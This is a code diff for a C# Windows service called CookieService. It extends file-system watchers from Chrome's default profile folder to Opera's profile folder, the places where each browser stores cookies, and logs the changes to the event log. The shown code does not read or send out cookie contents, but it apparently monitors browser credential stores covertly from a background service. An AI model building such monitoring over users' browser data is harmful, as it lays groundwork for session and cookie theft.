@@ -12,7 +12,7 @@ namespace CookieService
     public partial class Service1 : ServiceBase
     {
         private string logPath;
-        private bool googleLoggerEnabled;
+        private bool loggerEnabled = true;
         public Service1()
         {
             InitializeComponent();
@@ -33,13 +33,19 @@ namespace CookieService
 
             try
             {
-                Task.Run(() => StartGoogleLogger());
+                //Task.Run(() => StartGoogleLogger());
+                //Task.Run(() => StartOperaLogger());
+                //Task googleTask = new Task(() => StartGoogleLogger());
+                //Task operaTask = new Task(() => StartOperaLogger());
+
+                //Task.WhenAll(googleTask, operaTask);
+                Task.Run(() => StartLoggers());
             } catch (Exception e) { EventLog.WriteEntry(e.Message); }
             //this.StartGoogleLogger();
         }
         protected override void OnStop()
         {
-            this.googleLoggerEnabled = false;
+            this.loggerEnabled = false;
         }
 
         private void Watcher_Renamed(object sender, RenamedEventArgs e)
@@ -87,35 +93,102 @@ namespace CookieService
             }
         }
 
-        private void StartGoogleLogger()
+        private void StartLoggers()
         {
             lock (this)
             {
                 try
                 {
-                    string cookiePath = Path.GetPathRoot(Environment.SystemDirectory) + @"Users\" + $"{this.GetUserName()}" + @"\AppData\Local\Google\Chrome\User Data\Default";
-                    EventLog.WriteEntry(cookiePath);
-                    googleLoggerEnabled = true;
+                    FileSystemWatcher[] fileWatchers = new FileSystemWatcher[2] { new FileSystemWatcher(Path.GetPathRoot(Environment.SystemDirectory) + @"Users\" + $"{this.GetUserName()}" + @"\AppData\Local\Google\Chrome\User Data\Default"), 
+                    new FileSystemWatcher(Path.GetPathRoot(Environment.SystemDirectory) + @"Users\" + $"{this.GetUserName()}" + @"\AppData\Roaming\Opera Software\Opera Stable")};
 
-                    FileSystemWatcher googleWatcher = new FileSystemWatcher(cookiePath);
+                    EventLog.WriteEntry("fileWatchers done");
+                    loggerEnabled = true;
 
-                    googleWatcher.Deleted += Watcher_Deleted;
-                    googleWatcher.Created += Watcher_Created;
-                    googleWatcher.Changed += Watcher_Changed;
-                    googleWatcher.Renamed += Watcher_Renamed;
+                    foreach(FileSystemWatcher fileWatcher in fileWatchers)
+                    {
+                        fileWatcher.Deleted += Watcher_Deleted;
+                        fileWatcher.Created += Watcher_Created;
+                        fileWatcher.Changed += Watcher_Changed;
+                        fileWatcher.Renamed += Watcher_Renamed;
 
-                    googleWatcher.EnableRaisingEvents = true;
+                        fileWatcher.EnableRaisingEvents = true;
+                    }
 
                     try
                     {
-                        while (googleLoggerEnabled)
+                        while (loggerEnabled)
                         {
                             Thread.Sleep(3000);
                         }
-                    } catch (Exception e) { EventLog.WriteEntry(e.Message); }
-                } catch (Exception e) { EventLog.WriteEntry(e.Message); }
-            }
+                    }
+                    catch (Exception e) { EventLog.WriteEntry(e.Message); }
+                }
+                catch (Exception e) { EventLog.WriteEntry(e.Message); }
+            }        
         }
+
+        //private void StartGoogleLogger()
+        //{
+        //    lock (this)
+        //    {
+        //        try
+        //        {
+        //            string cookiePath = Path.GetPathRoot(Environment.SystemDirectory) + @"Users\" + $"{this.GetUserName()}" + @"\AppData\Local\Google\Chrome\User Data\Default";
+        //            EventLog.WriteEntry(cookiePath);
+        //            loggerEnabled = true;
+
+        //            FileSystemWatcher googleWatcher = new FileSystemWatcher(cookiePath);
+
+        //            googleWatcher.Deleted += Watcher_Deleted;
+        //            googleWatcher.Created += Watcher_Created;
+        //            googleWatcher.Changed += Watcher_Changed;
+        //            googleWatcher.Renamed += Watcher_Renamed;
+
+        //            googleWatcher.EnableRaisingEvents = true;
+
+        //            try
+        //            {
+        //                while (loggerEnabled)
+        //                {
+        //                    Thread.Sleep(1000);
+        //                }
+        //            } catch (Exception e) { EventLog.WriteEntry(e.Message); }
+        //        } catch (Exception e) { EventLog.WriteEntry(e.Message); }
+        //    }
+        //}
+
+        //private void StartOperaLogger()
+        //{
+        //    lock (this)
+        //    {
+        //        try
+        //        {
+        //            string cookiePath = Path.GetPathRoot(Environment.SystemDirectory) + @"Users\" + $"{this.GetUserName()}" + @"\AppData\Roaming\Opera Software\Opera Stable";
+        //            EventLog.WriteEntry(cookiePath);
+        //            loggerEnabled = true;
+
+        //            FileSystemWatcher operaWatcher = new FileSystemWatcher(cookiePath);
+
+        //            operaWatcher.Deleted += Watcher_Deleted;
+        //            operaWatcher.Created += Watcher_Created;
+        //            operaWatcher.Changed += Watcher_Changed;
+        //            operaWatcher.Renamed += Watcher_Renamed;
+    
+        //            operaWatcher.EnableRaisingEvents = true;
+
+        //            try
+        //            {
+        //                while (loggerEnabled)
+        //                {
+        //                    Thread.Sleep(3000);
+        //                }
+        //            }
+        //            catch (Exception e) { EventLog.WriteEntry(e.Message); }
+        //        }
+        //        catch (Exception e) { EventLog.WriteEntry(e.Message); }
+        //    }
+        //}
 
         private string GetUserName()
         {
